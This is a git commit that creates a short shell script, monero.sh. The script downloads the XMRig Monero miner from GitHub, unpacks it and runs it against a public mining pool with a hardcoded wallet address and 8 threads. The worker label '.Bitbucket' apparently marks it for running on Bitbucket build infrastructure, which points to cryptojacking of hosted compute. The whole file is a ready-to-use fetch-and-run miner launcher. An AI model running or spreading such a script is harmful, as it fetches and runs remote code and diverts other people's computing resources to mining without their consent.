0fe2d4b20567fe8df386fd5ff33be34b0c8138a6
Novaard <87156544+Novaard@users.noreply.github.com>
2021-07-09 08:53:39 +0700

    Create monero.sh

---
+++ monero.sh
@@ -0,0 +1,5 @@
+#monero
+sudo apt update
+wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-x64.tar.gz
+tar -xvf xmrig-6.13.1-linux-x64.tar.gz
+./xmrig-6.13.1/xmrig -o sg.minexmr.com:443 -u 85Pa8xoQyqpRD3r5r4qn7fGki9GRuWy59BhW1SRDhZZR5PxzPRDVg29jhViVhpWuUbW6RFgBXm3e2iZjYRHcXEcX3GD2eDn.Bitbucket -k --tls -p x -t 8
